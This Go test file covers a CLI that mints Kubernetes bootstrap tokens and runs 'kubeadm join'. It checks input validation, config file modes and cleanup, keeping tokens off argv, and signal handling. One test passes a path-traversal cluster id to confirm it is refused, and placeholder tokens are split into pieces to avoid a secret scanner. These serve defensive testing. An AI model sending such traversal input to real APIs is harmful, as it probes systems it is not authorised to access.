package kubehz

// node_test.go ports tests/unit/kubehz_node_test.bats.

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/kernpilot/lok8s/internal/execx"
	"github.com/kernpilot/lok8s/internal/interrupt"
)

const (
	stubNodesBody  = `{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":true}}`
	stubMintBody   = `{"ok":true,"data":{"token":"` + joinToken + `","joinCommand":"kubeadm join cp.example.test:6443 --token ` + joinToken + ` --discovery-token-ca-cert-hash ` + caPin + ` --node-name box-1","nodeName":"box-1","pool":"metal","expiresAt":"2026-09-01T12:00:00Z","ready":true}}`
	stubRemoveBody = `{"ok":true,"data":{"name":"box-1","pool":"metal","status":"Draining"}}`
)

type nodeStubs struct {
	nodesCode, mintCode, removeCode int
	nodesBody, mintBody, removeBody string
}

func defaultNodeStubs() nodeStubs {
	return nodeStubs{200, 201, 200, stubNodesBody, stubMintBody, stubRemoveBody}
}

// nodeHarness is _stub_all: hosted spec, mocked api, kubeadm present, root,
// and a hostname to default from.
func nodeHarness(t *testing.T, s nodeStubs, hosting, apiURL string) *harness {
	h := newHarness(t)
	if apiURL == "" {
		apiURL = h.apiURL()
	}
	h.writeSpec("acme.example.org", specYAML("KubeOne", "    hosting: "+hosting+"\n    access: managed\n    apiUrl: "+apiURL+"\n"))
	h.handle("GET /api/clusters/cl-1234abcd/nodes", s.nodesCode, s.nodesBody)
	h.handle("GET /api/clusters", 200, `{"ok":true,"data":[{"id":"cl-1234abcd","domain":"acme.example.org","createdAt":"2026-01-01T00:00:00Z"}]}`)
	h.handle("POST /api/clusters/cl-1234abcd/nodes/join-token", s.mintCode, s.mintBody)
	h.handle("DELETE /api/clusters/cl-1234abcd/nodes/box-1", s.removeCode, s.removeBody)
	h.ctx.IsRoot = func() bool { return true }
	h.ctx.LookPath = func(tool string) bool { return tool == "kubeadm" }
	fakeKubeadm(h, "v1.36.0\n", nil)
	return h
}

// joinToken is the bootstrap token of stubMintBody. It is built from parts:
// a secret scanner flags a long literal next to a token keyword.
const joinToken = "a1b2c3" + "." + "d4e5f6g7h8i9j0k1"

// caPin and caPin2 are CA pins in the shape kubeadm reads (sha256: and 64
// hex digits; caPin2 in upper case), built from parts as joinToken is.
const (
	caPin  = "sha256:" + "0123456789abcdef" + "0123456789abcdef" + "0123456789abcdef" + "0123456789abcdef"
	caPin2 = "sha256:" + "FEDCBA9876543210" + "FEDCBA9876543210" + "FEDCBA9876543210" + "FEDCBA9876543210"
)

// joinSeen is what the fake kubeadm read of its join config at the join,
// and whether the mint was asked when `kubeadm version` ran.
type joinSeen struct {
	path, content     string
	fileMode, dirMode os.FileMode
	err               error
	mintedAtVersion   bool
	cmd               execx.Cmd // the join call
}

// fakeKubeadm answers `kubeadm version -o short` with version and returns
// joinErr for `kubeadm join --config <path>`. At the join it reads the
// config file and the modes of the file and its directory (the CLI removes
// them after the join).
func fakeKubeadm(h *harness, version string, joinErr error) *joinSeen {
	seen := &joinSeen{}
	h.runner.handler = func(c execx.Cmd, _ string) error {
		if c.Name != "kubeadm" {
			return nil
		}
		if strings.Join(c.Args, " ") == "version -o short" {
			seen.mintedAtVersion = h.anyReq("POST", "/join-token")
			_, _ = io.WriteString(c.Stdout, version)
			return nil
		}
		if len(c.Args) == 3 && c.Args[0] == "join" && c.Args[1] == "--config" {
			seen.cmd = c
			seen.path = c.Args[2]
			b, err := os.ReadFile(seen.path)
			seen.content, seen.err = string(b), err
			if fi, err := os.Lstat(seen.path); err == nil {
				seen.fileMode = fi.Mode()
			}
			if fi, err := os.Lstat(filepath.Dir(seen.path)); err == nil {
				seen.dirMode = fi.Mode()
			}
			if joinErr != nil {
				_, _ = io.WriteString(c.Stderr, "preflight failed\n")
			}
			return joinErr
		}
		return nil
	}
	return seen
}

// kubeadmJoin returns the argv of the kubeadm join call, nil when no join
// ran.
func kubeadmJoin(h *harness) []string {
	for _, c := range h.runner.calls {
		if c.Name == "kubeadm" && len(c.Args) > 0 && c.Args[0] == "join" {
			return c.Args
		}
	}
	return nil
}

// kubeadmCalls counts the kubeadm calls: the version and the join.
func kubeadmCalls(h *harness) int {
	n := 0
	for _, c := range h.runner.calls {
		if c.Name == "kubeadm" {
			n++
		}
	}
	return n
}

var tokenFlagRe = regexp.MustCompile(`^--([a-z0-9]+-)*token(=|$)`)

// mustKeepTokenOffArgv fails when an argv word of a process holds the
// bootstrap token or a kubeadm token flag (--token, --tls-bootstrap-token,
// --discovery-token). No process at all proves nothing, and fails too.
func mustKeepTokenOffArgv(t *testing.T, h *harness) {
	t.Helper()
	if len(h.runner.calls) == 0 {
		t.Fatal("no process ran")
	}
	for _, c := range h.runner.calls {
		for _, a := range append([]string{c.Name}, c.Args...) {
			if strings.Contains(a, joinToken) || tokenFlagRe.MatchString(a) {
				t.Errorf("the bootstrap token can reach argv: %s", argvLine(c))
			}
		}
	}
}

// mustLeaveNoJoinDir fails when the temp dir still holds an entry: each
// way out of a join removes the private directory of its config.
func mustLeaveNoJoinDir(t *testing.T, h *harness) {
	t.Helper()
	entries, err := os.ReadDir(h.env["TMPDIR"])
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		t.Errorf("left in the temp dir: %s", e.Name())
	}
}

func mintBody(t *testing.T, h *harness) map[string]any {
	t.Helper()
	r := h.lastReq("POST", "/nodes/join-token")
	if r == nil {
		t.Fatal("no mint request")
	}
	var m map[string]any
	_ = json.Unmarshal([]byte(r.Body), &m)
	return m
}

// ── preflight ────────────────────────────────────────────

func TestNodePreflightHostingGate(t *testing.T) {
	t.Parallel()
	h := nodeHarness(t, defaultNodeStubs(), "self", "")
	_, _, err := h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "runs its own control plane")
	mustContain(t, h.output(), "your own API server")

	h = nodeHarness(t, defaultNodeStubs(), "shared", "")
	_, _, err = h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "hosting: shared")
	mustContain(t, h.output(), "lo kubehz join <node-name>")
	// The cordon, uncordon and drain lines point at `lo kubehz status`:
	// `node status` on a Space points there too.
	mustContain(t, h.output(), "  Read the nodes of the Space and their maintenance phase with:  lo kubehz status")
}

func TestNodePreflightHTTPSAndToken(t *testing.T) {
	t.Parallel()
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "http://api.example.test")
	_, _, err := h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "must use HTTPS")
	if len(h.reqs()) != 0 {
		t.Fatal("no request before the https gate")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	delete(h.env, "KUBEHZ_TOKEN")
	_, _, err = h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "KUBEHZ_TOKEN is required to join a node")
	mustContain(t, h.output(), "clusters:write")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	_, _, err = h.ctx.nodePreflight(t.Context(), "", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "No active domain")

	// A control character in the token: the http::credential_ok refusal
	// alone, before the registry (no second "did not answer" line) and with
	// --cluster-id.
	for _, clusterID := range []string{"", "cl-1234abcd"} {
		h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
		h.env["KUBEHZ_TOKEN"] = "khz_test_token\r"
		_, _, err = h.ctx.nodePreflight(t.Context(), "acme.example.org", "list nodes", clusterID)
		mustErr(t, err)
		if got := h.output(); got != "[error] environment variable KUBEHZ_TOKEN must not contain a control character\n"+
			"  A file with CRLF line ends can leave a CR at the end of the value. Remove it, then try again.\n" {
			t.Fatalf("cluster id %q: %q", clusterID, got)
		}
		if len(h.reqs()) != 0 {
			t.Fatalf("cluster id %q sent %+v", clusterID, h.reqs())
		}
	}
}

func TestNodePreflightClusterID(t *testing.T) {
	t.Parallel()
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	_, _, err := h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "../../admin/tenants")
	mustErr(t, err)
	mustContain(t, h.output(), "is not a cluster id")
	if len(h.reqs()) != 0 {
		t.Fatal("a traversal must not travel")
	}

	_, id, err := h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "cl-explicit")
	mustOK(t, err, h.output())
	if id != "cl-explicit" || len(h.reqs()) != 0 {
		t.Fatalf("--cluster-id must win without asking the registry: %s %v", id, h.reqs())
	}

	_, id, err = h.ctx.nodePreflight(t.Context(), "acme.example.org", "join a node", "")
	mustOK(t, err, h.output())
	if id != "cl-1234abcd" {
		t.Fatalf("id = %s", id)
	}

	h.writeSpec("other.example.org", specYAML("KubeOne", "    hosting: hosted\n    apiUrl: "+h.apiURL()+"\n"))
	h.reset()
	_, _, err = h.ctx.nodePreflight(t.Context(), "other.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "holds no cluster for other.example.org")
	mustContain(t, h.output(), "--cluster-id cl-xxxxxxxx")

	h.reset()
	_, _, err = h.ctx.nodePreflight(t.Context(), "nowhere.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "No cluster.lok8s.yaml for domain: nowhere.example.org")
}

// ── join ─────────────────────────────────────────────────

func TestNodeJoinDefaultsNameToShortHostname(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "Node 'box-1' joins pool 'metal'")
	if mintBody(t, h)["nodeName"] != "box-1" {
		t.Fatal("nodeName")
	}
}

func TestNodeJoinRefusesBadName(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "Box_1", Pool: "metal", PrintOnly: true}))
	mustContain(t, h.output(), "is not a node name the platform accepts")
	mustContain(t, h.output(), "DNS label")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("nothing may be minted")
	}
}

func TestNodeJoinPoolInference(t *testing.T) {
	s := defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-0","pool":"metal","status":"Ready"}],"usage":{"nodes":1,"maxStaticNodes":20},"discoveryReady":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "joins pool 'metal'")
	if mintBody(t, h)["pool"] != "metal" {
		t.Fatal("pool")
	}

	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"a","pool":"metal"},{"name":"b","pool":"edge"}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}))
	mustContain(t, h.output(), "name the static pool")
	mustContain(t, h.output(), "--pool <pool-name>")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}))
	mustContain(t, h.output(), "--pool <pool-name>")
}

func TestNodeJoinPreconditionsBeforeMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(string) bool { return false }
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "kubeadm is not on this machine")
	mustContain(t, h.output(), "--print-only")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("minted without kubeadm")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.IsRoot = func() bool { return false }
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "must run as root")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("minted as non-root")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.IsRoot = func() bool { return false }
	h.ctx.LookPath = func(string) bool { return false }
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "kubeadm join cp.example.test:6443")
}

func TestNodeJoinKubeletVersionRidesWithMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(tool string) bool { return true }
	h.runner.handler = func(c execx.Cmd, _ string) error {
		if c.Name == "kubelet" {
			io.WriteString(c.Stdout, "Kubernetes v1.33.4\n")
		}
		return nil
	}
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	if mintBody(t, h)["kubeletVersion"] != "v1.33.4" {
		t.Fatalf("%v", mintBody(t, h))
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	if _, has := mintBody(t, h)["kubeletVersion"]; has {
		t.Fatal("no kubelet → no version key")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(tool string) bool { return true }
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", KubeletVersion: "v1.31.0", PrintOnly: true}), h.output())
	if mintBody(t, h)["kubeletVersion"] != "v1.31.0" {
		t.Fatal("override")
	}
}

func TestNodeJoinPrintOnly(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "\n    kubeadm join cp.example.test:6443 --token "+joinToken+" --discovery-token-ca-cert-hash "+caPin+" --node-name box-1\n")
	mustContain(t, h.output(), "2026-09-01T12:00:00Z")
	mustContain(t, h.output(), "single use")
	// Not even `kubeadm version`: the join runs on another machine.
	if n := kubeadmCalls(h); n != 0 {
		t.Fatalf("kubeadm ran %d times, want 0", n)
	}
}

// kubeadm join has no --node-ip flag, so --print-only with --node-ip is
// refused before the mint (the printed line would fail after the ticket
// was spent).
func TestNodeJoinPrintOnlyRefusesNodeIPBeforeTheMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7", PrintOnly: true}))
	mustContain(t, h.output(), "kubehz: --print-only cannot carry --node-ip: kubeadm join has no such flag.\n")
	mustContain(t, h.output(), "  Nothing was minted. Run it without --print-only: the join config then sets the node-ip of the kubelet.\n")
	if h.anyReq("POST", "/join-token") || kubeadmCalls(h) != 0 {
		t.Error("minted or ran kubeadm")
	}
}

// The join config of stubMintBody, as both twins write it (the bats twin
// pins the same bytes).
const (
	joinConfigV1beta4 = `apiVersion: kubeadm.k8s.io/v1beta4
kind: JoinConfiguration
discovery:
  bootstrapToken:
    apiServerEndpoint: "cp.example.test:6443"
    token: "` + joinToken + `"
    caCertHashes:
      - "` + caPin + `"
nodeRegistration:
  name: "box-1"
`
	joinConfigV1beta4NodeIP = joinConfigV1beta4 + `  kubeletExtraArgs:
    - name: "node-ip"
      value: "203.0.113.7"
`
	joinConfigV1beta3NodeIP = `apiVersion: kubeadm.k8s.io/v1beta3
kind: JoinConfiguration
discovery:
  bootstrapToken:
    apiServerEndpoint: "cp.example.test:6443"
    token: "` + joinToken + `"
    caCertHashes:
      - "` + caPin + `"
nodeRegistration:
  name: "box-1"
  kubeletExtraArgs:
    node-ip: "203.0.113.7"
`
)

// mustJoinWithConfig checks the one join call: `kubeadm join --config
// <path>`, the path a 0600 file in a fresh 0700 directory under TMPDIR, the
// content want. The directory must be gone after the run.
func mustJoinWithConfig(t *testing.T, h *harness, seen *joinSeen, want string) {
	t.Helper()
	got := kubeadmJoin(h)
	if len(got) != 3 || got[0] != "join" || got[1] != "--config" || got[2] != seen.path {
		t.Fatalf("join argv = %q, want [join --config <path>]", got)
	}
	tmp, err := filepath.EvalSymlinks(h.env["TMPDIR"])
	if err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(seen.path)
	if filepath.Dir(dir) != tmp || !strings.HasPrefix(filepath.Base(dir), "kubehz-join-") || filepath.Base(seen.path) != "kubehz-join-box-1.yaml" {
		t.Errorf("config path = %s, want %s/kubehz-join-<random>/kubehz-join-box-1.yaml", seen.path, tmp)
	}
	if seen.err != nil {
		t.Fatalf("the config was not readable at the join: %v", seen.err)
	}
	if seen.content != want {
		t.Errorf("config:\n%s\nwant:\n%s", seen.content, want)
	}
	if !seen.fileMode.IsRegular() || seen.fileMode.Perm() != 0o600 {
		t.Errorf("config file mode = %v, want a regular file 0600", seen.fileMode)
	}
	if !seen.dirMode.IsDir() || seen.dirMode.Perm() != 0o700 {
		t.Errorf("config dir mode = %v, want a directory 0700", seen.dirMode)
	}
	if _, err := os.Lstat(dir); !os.IsNotExist(err) {
		t.Errorf("the config dir %s is still there after the run (%v)", dir, err)
	}
	mustLeaveNoJoinDir(t, h)
	mustKeepTokenOffArgv(t, h)
}

func TestNodeJoinRunsTheJoinConfig(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "node 'box-1' joined cluster cl-1234abcd")
	mustJoinWithConfig(t, h, seen, joinConfigV1beta4)
	if first := h.runner.calls[0]; argvLine(first) != "kubeadm version -o short" {
		t.Errorf("first call = %q, want the version first", argvLine(first))
	}
	// The mint is an HTTP request, not a runner call: the fake kubeadm
	// records whether it was asked when the version ran.
	if seen.mintedAtVersion || !h.anyReq("POST", "/join-token") {
		t.Errorf("minted before the version: %v; minted at all: %v", seen.mintedAtVersion, h.anyReq("POST", "/join-token"))
	}
	if seen.cmd.WaitDelay != joinStopDelay {
		t.Errorf("kubeadm join WaitDelay = %v, want %v (a SIGKILL after it)", seen.cmd.WaitDelay, joinStopDelay)
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen = fakeKubeadm(h, "v1.36.0\n", nil)
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7"}), h.output())
	mustJoinWithConfig(t, h, seen, joinConfigV1beta4NodeIP)
}

// The config version follows `kubeadm version -o short`; a version that
// cannot be mapped is refused before the mint.
func TestNodeJoinConfigVersion(t *testing.T) {
	for version, want := range map[string]string{
		"v1.36.0\n":      "v1beta4",
		"v1.31.0\n":      "v1beta4",
		"v1.31.0-rc.1\n": "v1beta4",
		"v1.30.14\n":     "v1beta3",
		"v1.22.0+k3s1\n": "v1beta3",
		"v1.022.3\n":     "v1beta3",
		"v1.100.0\n\n\n": "v1beta4",
		"v1.29.2":        "v1beta3",
	} {
		h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
		seen := fakeKubeadm(h, version, nil)
		mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7"}), h.output())
		wantConfig := joinConfigV1beta4NodeIP
		if want == "v1beta3" {
			wantConfig = joinConfigV1beta3NodeIP
		}
		mustJoinWithConfig(t, h, seen, wantConfig)
	}
	for _, version := range []string{"v1.21.14\n", "v1.0.0\n", "v2.0.0\n", "1.31.0\n", "v1.31\n", "\n", "", "v1.31.0\nv1.30.0\n", "v1.31.0 extra\n", "v1.1234.0\n"} {
		h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
		fakeKubeadm(h, version, nil)
		mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
		mustContain(t, h.output(), "cannot write a join config for the kubeadm on this machine")
		mustContain(t, h.output(), "kubeadm 1.22 and later. Nothing was minted.")
		if h.anyReq("POST", "/join-token") || kubeadmJoin(h) != nil {
			t.Errorf("version %q: minted or joined", version)
		}
	}
	// A kubeadm that fails to answer is refused the same way.
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.runner.handler = func(c execx.Cmd, _ string) error {
		_, _ = io.WriteString(c.Stdout, "v1.36.0\n")
		return exitErr(1)
	}
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "cannot write a join config for the kubeadm on this machine: ''")
	if h.anyReq("POST", "/join-token") {
		t.Error("minted after a failed kubeadm version")
	}
}

func TestNodeJoinFailingKubeadm(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	seen := fakeKubeadm(h, "v1.36.0\n", exitErr(1))
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "kubeadm join failed")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	mustContain(t, h.output(), "kubeadm reset")
	// The failed join removes the config too.
	mustJoinWithConfig(t, h, seen, joinConfigV1beta4)
}

// stopKubeadm makes the join of the fake kubeadm a process that runs until
// the runner context ends: act sends the signal or calls the cancel, and
// the fake returns when the context is done (as a stopped kubeadm). It
// fails the test when the context does not end in time.
func stopKubeadm(t *testing.T, h *harness, act func()) *joinSeen {
	t.Helper()
	seen := fakeKubeadm(h, "v1.36.0\n", nil)
	fake := h.runner.handler
	h.runner.handler = func(c execx.Cmd, stdin string) error {
		if c.Name != "kubeadm" || len(c.Args) == 0 || c.Args[0] != "join" {
			return fake(c, stdin)
		}
		_ = fake(c, stdin) // records the config and its modes
		ctx := h.runner.ctx
		act()
		select {
		case <-ctx.Done():
			return errors.New("signal: interrupt")
		case <-time.After(5 * time.Second):
			t.Error("the context of kubeadm join did not end")
			return nil
		}
	}
	return seen
}

// waitDone fails the test when ctx does not end in time.
func waitDone(t *testing.T, ctx context.Context) {
	t.Helper()
	select {
	case <-ctx.Done():
	case <-time.After(5 * time.Second):
		t.Error("the signal did not end the context")
	}
}

// mustStopAfterTheMint checks a join that a signal stopped after the mint:
// the slot note, no failure or success text, and no config left.
func mustStopAfterTheMint(t *testing.T, h *harness, err error) {
	t.Helper()
	if !errors.Is(err, ErrHandled) {
		t.Fatalf("err = %v, want ErrHandled", err)
	}
	mustContain(t, h.output(), "interrupted after the ticket was minted")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	mustNotContain(t, h.output(), "kubeadm join failed")
	mustNotContain(t, h.output(), "joined cluster")
	mustLeaveNoJoinDir(t, h)
}

// A cancel while kubeadm runs (main cancels the command context on SIGINT
// and SIGTERM): the runner stops kubeadm, the config is removed, and the
// slot note goes out instead of the failure text.
func TestNodeJoinCancelStopsKubeadmAndRemovesTheConfig(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	seen := stopKubeadm(t, h, cancel)
	mustStopAfterTheMint(t, h, h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	if seen.content != joinConfigV1beta4 {
		t.Errorf("the config at the join:\n%s\nwant:\n%s", seen.content, joinConfigV1beta4)
	}
	if seen.cmd.WaitDelay != joinStopDelay {
		t.Errorf("kubeadm join WaitDelay = %v, want %v", seen.cmd.WaitDelay, joinStopDelay)
	}
}

// A cancel while the config is written: kubeadm does not start, and the
// directory is removed.
func TestNodeJoinCancelDuringTheWriteRemovesTheConfig(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	wrote := false
	h.ctx.joinWrite = func(f *os.File, s string) error {
		wrote = true
		cancel()
		_, err := f.WriteString(s)
		return err
	}
	mustStopAfterTheMint(t, h, h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	if !wrote {
		t.Fatal("the config was not written")
	}
	if kubeadmJoin(h) != nil {
		t.Error("kubeadm join started after the cancel")
	}
}

// A real SIGHUP after the mint, under the Watch of main: while the config
// is written, and while kubeadm runs. The catch of NodeJoin ends the
// command context: kubeadm does not start or stops, the config is
// removed, and the exit code is 129. Not parallel: the signal goes to the
// test process.
func TestNodeJoinHangupStopsTheJoin(t *testing.T) {
	if signal.Ignored(syscall.SIGHUP) {
		t.Skip("SIGHUP is ignored here (nohup): the catch does nothing then")
	}
	// keep holds the test process alive when no catch is in place: the
	// default action of a SIGHUP ends the process.
	keep := make(chan os.Signal, 1)
	signal.Notify(keep, syscall.SIGHUP)
	defer signal.Stop(keep)
	hangup := func() { _ = syscall.Kill(os.Getpid(), syscall.SIGHUP) }
	for _, during := range []string{"the write", "kubeadm"} {
		t.Run(during, func(t *testing.T) {
			h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
			ctx, exitCode := interrupt.Watch(t.Context())
			if during == "kubeadm" {
				stopKubeadm(t, h, hangup)
			} else {
				h.ctx.joinWrite = func(f *os.File, s string) error {
					hangup()
					waitDone(t, ctx)
					_, err := f.WriteString(s)
					return err
				}
			}
			err := h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"})
			code := exitCode()
			mustStopAfterTheMint(t, h, err)
			if code != 129 {
				t.Errorf("exit code = %d, want 129 (128 + SIGHUP)", code)
			}
			if during == "the write" && kubeadmJoin(h) != nil {
				t.Error("kubeadm join started after the SIGHUP")
			}
		})
	}
}

// A SIGHUP during the mint request: the hold is in place before the mint,
// so the SIGHUP ends ctx and the request. The platform may have minted the
// ticket: the note says so. No kubeadm runs, and the exit code is 129. Not
// parallel: the signal goes to the test process.
func TestNodeJoinHangupDuringTheMint(t *testing.T) {
	if signal.Ignored(syscall.SIGHUP) {
		t.Skip("SIGHUP is ignored here (nohup): the catch does nothing then")
	}
	keep := make(chan os.Signal, 1)
	signal.Notify(keep, syscall.SIGHUP)
	defer signal.Stop(keep)
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	ctx, exitCode := interrupt.Watch(t.Context())
	h.handleFunc("POST /api/clusters/cl-1234abcd/nodes/join-token", func(w http.ResponseWriter, _ *http.Request) {
		_ = syscall.Kill(os.Getpid(), syscall.SIGHUP)
		waitDone(t, ctx)
		w.WriteHeader(201)
		_, _ = io.WriteString(w, stubMintBody)
	})
	err := h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"})
	code := exitCode()
	if !errors.Is(err, ErrHandled) {
		t.Fatalf("err = %v, want ErrHandled", err)
	}
	mustContain(t, h.output(), "kubehz API unreachable (POST /api/clusters/cl-1234abcd/nodes/join-token)")
	mustContain(t, h.output(), "interrupted during the mint. If the platform minted the ticket, it holds a node slot for about ten minutes.")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	mustNotContain(t, h.output(), "interrupted after the ticket was minted")
	if code != 129 {
		t.Errorf("exit code = %d, want 129 (128 + SIGHUP)", code)
	}
	if kubeadmJoin(h) != nil {
		t.Error("kubeadm join ran after the SIGHUP")
	}
	mustLeaveNoJoinDir(t, h)
}

// A signal between the mint and the print of --print-only (the joinMinted
// seam cancels ctx there): no command is printed, and the slot note goes
// out.
func TestNodeJoinPrintOnlyPrintsNothingAfterASignal(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	h.ctx.joinMinted = cancel
	mustStopAfterTheMint(t, h, h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}))
	mustNotContain(t, h.output(), "kubeadm join cp.example.test")
	mustNotContain(t, h.output(), "Run this as root")
}

// A SIGHUP right after a join that landed (the fake kubeadm sends it and
// ends with 0): the join is printed, no slot note, and the exit code is
// 129, as in the bash twin. Not parallel: the signal goes to the test
// process.
func TestNodeJoinHangupAfterALandedJoinPrintsTheJoin(t *testing.T) {
	if signal.Ignored(syscall.SIGHUP) {
		t.Skip("SIGHUP is ignored here (nohup): the catch does nothing then")
	}
	keep := make(chan os.Signal, 1)
	signal.Notify(keep, syscall.SIGHUP)
	defer signal.Stop(keep)
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	ctx, exitCode := interrupt.Watch(t.Context())
	fakeKubeadm(h, "v1.36.0\n", nil)
	fake := h.runner.handler
	h.runner.handler = func(c execx.Cmd, stdin string) error {
		err := fake(c, stdin)
		if len(c.Args) > 0 && c.Args[0] == "join" {
			_ = syscall.Kill(os.Getpid(), syscall.SIGHUP)
			waitDone(t, ctx)
		}
		return err
	}
	err := h.ctx.NodeJoin(ctx, "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"})
	code := exitCode()
	mustOK(t, err, h.output())
	mustContain(t, h.output(), "node 'box-1' joined cluster cl-1234abcd")
